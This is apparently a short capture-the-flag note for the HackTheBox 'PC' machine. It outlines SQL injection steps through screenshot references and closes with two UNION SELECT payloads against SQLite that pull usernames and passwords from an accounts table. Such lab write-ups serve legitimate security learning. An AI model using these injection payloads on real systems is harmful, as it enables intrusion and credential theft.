
there was a bit of fiddling with the token

confirm sqli (or at least math :D)
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp1.png]]

Get version
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp2.png]]

Get tables
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp3.png]]

Get columns
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp4.png]]


Get usernames
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp5.png]]

Get passwords
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp6.png]]

Prettier output
![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp7.png]]
```sql
2 UNION SELECT 'usernames: ' || group_concat(username,', ') || ' - ' || 'passwords: ' || group_concat(password,', ') FROM accounts -- -
```

```
{
    "id": "2 UNION SELECT sqlite_version() || ', [' || group_concat(tbl_name,', ') FROM sqlite_master WHERE type='table' || '], [usernames: ' || group_concat(username,', ') FROM accounts || ' - passwords: ' || group_concat(password,', ') FROM accounts || ']'"
}
```